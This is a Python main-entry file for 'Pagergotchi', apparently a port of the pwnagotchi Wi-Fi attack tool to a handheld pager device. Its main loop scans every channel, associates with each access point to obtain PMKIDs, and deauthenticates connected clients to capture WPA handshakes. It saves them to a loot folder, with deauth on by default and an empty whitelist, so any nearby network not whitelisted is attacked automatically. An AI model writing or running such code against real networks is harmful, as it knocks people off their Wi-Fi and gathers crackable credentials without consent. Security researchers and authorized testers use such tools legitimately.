"""
Pagergotchi Main Entry Point
Based on original pwnagotchi/cli.py with MINIMAL changes
"""
import logging
import time
import signal
import sys
import os

import pwnagotchi_port as pwnagotchi
from pwnagotchi_port import utils
from pwnagotchi_port import plugins
from pwnagotchi_port.agent import Agent
from pwnagotchi_port.ui.view import View


# Global exit flag - set by button thread
_exit_requested = False
_agent_ref = None  # Reference to agent for setting its exit flag


def _button_monitor_thread(display):
    """Background thread to monitor RED button for exit"""
    global _exit_requested, _agent_ref
    from pwnagotchi_port.ui.hw.pager import PBTN_A

    logging.info("[BUTTON] Monitor thread started")

    while not _exit_requested:
        try:
            current, pressed, released = display.poll_input()
            if pressed & PBTN_A:
                logging.info("[BUTTON] RED button pressed - requesting exit")
                _exit_requested = True
                # Also set agent's flag so view.wait() can exit early
                if _agent_ref:
                    _agent_ref._exit_requested = True
                break
        except Exception as e:
            logging.debug("[BUTTON] Poll error: %s", e)
        time.sleep(0.05)  # Poll every 50ms

    logging.info("[BUTTON] Monitor thread exiting")


def start_button_monitor(view):
    """Start background button monitoring thread"""
    import threading
    if hasattr(view, '_display') and view._display:
        t = threading.Thread(target=_button_monitor_thread, args=(view._display,), daemon=True)
        t.start()
        return t
    return None


def should_exit():
    """Check if exit was requested"""
    return _exit_requested


def do_auto_mode(agent):
    """
    Main loop - Based on original pwnagotchi/cli.py do_auto_mode()
    Changes: added debug logging, exit button check, broadcast deauth for PineAP
    """
    global _agent_ref
    logging.info("entering auto mode ...")

    agent.mode = 'auto'
    agent._exit_requested = False  # Initialize exit flag on agent
    _agent_ref = agent  # Store reference for button thread
    agent.start()

    # Start button monitor thread
    start_button_monitor(agent._view)

    while not should_exit():
        try:
            # recon on all channels
            logging.debug("[LOOP] Starting recon phase...")
            agent.recon()

            if should_exit():
                break

            # get nearby access points grouped by channel
            channels = agent.get_access_points_by_channel()
            logging.debug("[LOOP] Found %d channels with APs", len(channels))

            # for each channel
            for ch, aps in channels:
                if should_exit():
                    break

                time.sleep(1)
                logging.debug("[LOOP] Setting channel %d (%d APs)", ch, len(aps))
                agent.set_channel(ch)

                if not agent.is_stale() and agent.any_activity():
                    logging.info("%d access points on channel %d" % (len(aps), ch))

                # for each ap on this channel
                for ap in aps:
                    if should_exit():
                        break

                    hostname = ap.get('hostname', ap.get('mac', 'unknown'))

                    # send an association frame in order to get for a PMKID
                    logging.debug("[ATTACK] Associating with %s", hostname)
                    agent.associate(ap)

                    # deauth all client stations in order to get a full handshake
                    # (original behavior: only targeted deauth, skip if no clients)
                    clients = ap.get('clients', [])
                    if clients:
                        logging.debug("[ATTACK] Deauthing %d clients from %s", len(clients), hostname)
                        for sta in clients:
                            if should_exit():
                                break
                            agent.deauth(ap, sta)

            if should_exit():
                break

            # End of epoch
            logging.debug("[LOOP] Epoch complete, calling next_epoch()")
            agent.next_epoch()

        except Exception as e:
            if str(e).find("wifi.interface not set") > 0:
                logging.exception("main loop exception due to unavailable wifi device (%s)", e)
                logging.info("sleeping 60 seconds then advancing to next epoch")
                time.sleep(60)
                agent.next_epoch()
            else:
                logging.exception("main loop exception (%s)", e)

    logging.info("[LOOP] Exit requested, leaving main loop")


def load_config(config_path=None):
    """Load configuration - simplified for Pager"""
    # Default configuration matching original pwnagotchi defaults.toml
    config = {
        'main': {
            'name': 'pagergotchi',
            'iface': 'wlan1mon',
            'mon_start_cmd': '',
            'no_restart': True,
            'whitelist': [],
        },
        'personality': {
            # Timing
            'recon_time': 30,
            'max_inactive_scale': 2,
            'recon_inactive_multiplier': 2,
            'hop_recon_time': 10,
            'min_recon_time': 5,
            # Attacks
            'associate': True,
            'deauth': True,
            # Throttling - ORIGINAL VALUES from defaults.toml
            'throttle_a': 0.4,
            'throttle_d': 0.9,
            # Limits
            'ap_ttl': 120,
            'sta_ttl': 300,
            'min_rssi': -200,
            'max_interactions': 3,
            'max_misses_for_recon': 10,
            # Mood (reduced for more dynamic personality)
            'bored_num_epochs': 5,   # ~5 min of inactivity
            'sad_num_epochs': 10,    # ~10 min of inactivity
            # angry triggers at 2x sad = ~20 min
            'excited_num_epochs': 10,
            'bond_encounters_factor': 20000,
            # Channels (empty = all)
            'channels': [],
        },
        'bettercap': {
            'hostname': '127.0.0.1',
            'scheme': 'http',
            'port': 8081,
            'username': 'pwnagotchi',
            'password': 'pwnagotchi',
            'handshakes': '/root/loot/handshakes',
            'silence': ['wifi.client.probe'],
        },
        'ui': {
            'fps': 2.0,
            'display': {'type': 'pager'},
            'faces': {},
        }
    }

    # Try to load from config file
    if config_path and os.path.exists(config_path):
        try:
            import configparser
            cp = configparser.ConfigParser()
            cp.read(config_path)

            if 'capture' in cp:
                config['main']['iface'] = cp.get('capture', 'interface', fallback='wlan1mon')
                config['bettercap']['handshakes'] = cp.get('capture', 'output_dir', fallback='/root/loot/pagergotchi')

            if 'channels' in cp:
                channels_str = cp.get('channels', 'channels', fallback='')
                if channels_str:
                    config['personality']['channels'] = [int(c.strip()) for c in channels_str.split(',')]

            if 'whitelist' in cp:
                ssids = cp.get('whitelist', 'ssids', fallback='')
                if ssids:
                    config['main']['whitelist'] = [s.strip() for s in ssids.split(',')]

            if 'general' in cp:
                config['main']['debug'] = cp.getboolean('general', 'debug', fallback=False)

            if 'deauth' in cp:
                config['personality']['deauth'] = cp.getboolean('deauth', 'enabled', fallback=True)

            if 'timing' in cp:
                config['personality']['throttle_d'] = cp.getfloat('timing', 'throttle_d', fallback=0.9)
                config['personality']['throttle_a'] = cp.getfloat('timing', 'throttle_a', fallback=0.4)

            logging.info("Loaded config from %s", config_path)
        except Exception as e:
            logging.warning("Config load error: %s, using defaults", e)

    return config


def main():
    """Main entry point for Pagergotchi"""
    from pwnagotchi_port.log import setup_logging

    # Find config file
    config_paths = [
        '/root/payloads/user/reconnaissance/pagergotchi/config.conf',
        './config.conf',
        '../config.conf',
    ]

    config_path = None
    for path in config_paths:
        if os.path.exists(path):
            config_path = path
            break

    # Load config
    config = load_config(config_path)

    # Setup logging (only logs to file if debug=true in config)
    setup_logging(config)

    # Set name
    pwnagotchi.set_name(config['main'].get('name', 'pagergotchi'))

    # Load plugins (stub)
    plugins.load(config)

    # Show startup menu (Pager-specific addition)
    from pwnagotchi_port.ui.menu import StartupMenu
    startup_menu = StartupMenu(config)

    try:
        if not startup_menu.show_main_menu():
            logging.info("User chose to exit from menu")
            startup_menu.cleanup()
            return 0
    finally:
        startup_menu.cleanup()

    # Reload config in case whitelist changed
    config = load_config(config_path)

    # Create display/view
    view = View(config)

    # Create agent
    agent = Agent(view=view, config=config)

    # Signal handler
    def signal_handler(sig, frame):
        logging.info("Received signal %d, shutting down...", sig)
        agent._save_recovery_data()
        agent.stop()  # Stop backend and cleanup tcpdump
        view.on_shutdown()
        view.cleanup()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    try:
        do_auto_mode(agent)
    except KeyboardInterrupt:
        logging.info("Interrupted by user")
    finally:
        agent._save_recovery_data()
        agent.stop()  # Stop backend and cleanup tcpdump
        view.on_shutdown()
        view.cleanup()

    return 0


if __name__ == '__main__':
    sys.exit(main())
